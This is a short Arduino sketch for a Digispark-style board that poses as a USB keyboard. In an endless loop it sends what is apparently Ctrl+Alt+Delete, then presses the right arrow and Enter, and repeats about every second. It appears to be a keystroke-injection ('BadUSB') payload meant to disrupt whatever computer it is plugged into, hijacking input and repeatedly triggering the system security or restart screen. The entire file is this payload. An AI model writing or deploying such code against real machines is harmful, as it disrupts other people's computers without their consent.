#include "DigiKeyboard.h"

int a = 0;
int c = 0;

void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:
  

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(76 , MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  // DigiKeyboard.sendKeyStroke(KEY_ARROW_RIGHT);
  // DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_RIGHT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.delay(100);
    
  
  
}
